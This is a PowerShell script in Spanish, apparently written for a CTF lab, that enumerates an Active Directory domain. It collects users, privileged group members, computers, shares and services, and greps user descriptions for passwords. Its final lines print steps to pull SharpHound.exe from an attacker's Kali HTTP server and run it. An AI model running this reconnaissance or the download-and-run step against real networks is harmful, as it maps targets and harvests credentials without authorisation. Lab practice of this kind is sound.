# ============================================================
# CTF-WINDOWS-ENUM.ps1 - Enumeracion desde maquina dominio
# Ejecutar en PowerShell como ADMIN en maquina Windows unida al dominio
# ============================================================

Write-Host "[+] CTF Windows Enum Script - Itmar Castillo" -ForegroundColor Green

# --- INFORMACION BASICA ---
Write-Host "[+] Informacion del sistema:" -ForegroundColor Yellow
systeminfo | Select-String "Host Name|OS Name|Domain|Logon Server"
Write-Host "[+] Usuario actual: $(whoami)"
Write-Host "[+] IP: $(Get-NetIPAddress -AddressFamily IPv4 | Where-Object IPAddress -notlike '127.*' | Select-Object -First 1 IPAddress)"

# --- USUARIOS LOCALES ---
Write-Host "[+] Usuarios locales:" -ForegroundColor Yellow
Get-LocalUser | Where-Object Enabled -eq $true | ft Name,Enabled,LastLogon

# --- USUARIOS DEL DOMINIO ---
Write-Host "[+] Usuarios del dominio:" -ForegroundColor Yellow
try {
  Get-ADUser -Filter * -Properties Description,LastLogonDate,PasswordLastSet |
    Where-Object Enabled -eq $true |
    Select-Object Name,SamAccountName,Description,PasswordLastSet |
    ft -AutoSize
} catch {
  Write-Host "[-] No se pudo conectar al AD. Instala RSAT o usa el módulo AD"
}

# --- GRUPOS DEL DOMINIO ---
Write-Host "[+] Grupos del dominio:" -ForegroundColor Yellow
try {
  Get-ADGroup -Filter * | Select-Object Name,GroupScope,GroupCategory | ft -AutoSize
} catch {}

# --- BUSCAR PASSWORDS EN DESCRIPTION ---
Write-Host "[+] Buscando passwords en description..." -ForegroundColor Yellow
try {
  Get-ADUser -Filter * -Properties Description |
    Where-Object { $_.Description -ne $null -and $_.Description -ne "" } |
    Select-Object Name,SamAccountName,Description |
    ft -AutoSize

  Get-ADUser -Filter * -Properties Description |
    Where-Object { $_.Description -match "pass|contrase|pwd|123|Password" } |
    Select-Object Name,SamAccountName,Description |
    ft -AutoSize
} catch {}

# --- COMPUTADORAS DEL DOMINIO ---
Write-Host "[+] Computadoras del dominio:" -ForegroundColor Yellow
try { Get-ADComputer -Filter * -Properties OperatingSystem | ft Name,OperatingSystem -AutoSize } catch {}

# --- GRUPOS PRIVILEGIADOS ---
Write-Host "[+] Miembros de grupos privilegiados:" -ForegroundColor Yellow
$groups = @("Domain Admins", "Enterprise Admins", "Schema Admins",
            "DnsAdmins", "Administrators", "Remote Desktop Users")
foreach ($group in $groups) {
  try {
    $members = Get-ADGroupMember -Identity $group -ErrorAction SilentlyContinue
    if ($members) {
      Write-Host "  $group :" -ForegroundColor Red
      $members | Select-Object Name,SamAccountName,ObjectClass | ft -AutoSize
    }
  } catch {}
}

# --- RECURSOS COMPARTIDOS ---
Write-Host "[+] Recursos compartidos SMB:" -ForegroundColor Yellow
Get-SmbShare | ft Name,Path,Description -AutoSize

# --- PROCESOS Y SERVICIOS ---
Write-Host "[+] Servicios interesantes:" -ForegroundColor Yellow
Get-Service | Where-Object { $_.DisplayName -match "DNS|SQL|HTTP|Tomcat|Apache|MySQL" } |
  Select-Object Name,DisplayName,Status,StartType | ft -AutoSize

# --- POLITICAS DE AUDITORIA ---
Write-Host "[+] Políticas de contraseñas:" -ForegroundColor Yellow
net accounts /domain

# --- GENERAR REPORTE ---
$report = @"
==================================
REPORTE DE ENUMERACION WINDOWS
==================================
Fecha: $(Get-Date)
Usuario: $(whoami)
Dominio: $((Get-WmiObject Win32_ComputerSystem).Domain)

USUARIOS DEL DOMINIO:
$(try { Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName } catch { "No disponible" } )

GRUPOS PRIVILEGIADOS:
$(foreach ($g in @("Domain Admins", "Enterprise Admins")) {
  try { "  $g : $(Get-ADGroupMember -Identity $g | Select-Object -ExpandProperty SamAccountName -Join ', ')" } catch {}
})

COMPUTADORAS:
$(try { Get-ADComputer -Filter * | Select-Object -ExpandProperty Name } catch { "No disponible" } )
"@

$report | Out-File -FilePath "$env:TEMP\domain_enum_report.txt"
Write-Host "[+] Reporte guardado en $env:TEMP\domain_enum_report.txt" -ForegroundColor Green
Write-Host "[+] EJECUTA DESDE TU KALI:" -ForegroundColor Cyan
Write-Host "    python3 -m http.server 8000 &" -ForegroundColor White
Write-Host "    (en Windows:) Invoke-WebRequest -Uri 'http://172.31.254.___KALI__:8000/SharpHound.exe' -OutFile 'C:\temp\SharpHound.exe'" -ForegroundColor White
Write-Host "    (en Windows:) C:\temp\SharpHound.exe -c All" -ForegroundColor White
